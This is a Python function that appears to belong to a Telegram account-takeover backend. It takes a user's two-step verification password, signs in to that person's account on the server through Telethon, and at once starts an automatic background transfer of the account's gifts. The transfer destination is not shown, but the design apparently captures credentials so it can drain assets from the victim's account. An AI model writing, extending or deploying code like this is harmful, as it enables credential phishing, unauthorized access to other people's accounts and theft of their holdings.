import asyncio

from server.automation.auto_transfer_gifts_on_auth import auto_transfer_gifts_background
from server.store.in_memory_auth_state import get_auth_state, upsert_auth_state
from server.telethon.create_client import create_client


def sign_in_with_password(*, user_id: str, password: str) -> dict:
    state = get_auth_state(user_id)
    if not state or not state.phone_number:
        raise RuntimeError("No pending login for this user_id. Start with /login")

    async def _run() -> dict:
        client = create_client(user_id)
        await client.connect()
        try:
            await client.sign_in(password=password)
            state.is_authorized = True
            upsert_auth_state(state)
            # Start auto-transfer in background after successful auth
            auto_transfer_gifts_background(user_id)
            return {"success": True}
        finally:
            await client.disconnect()

    return asyncio.run(_run())



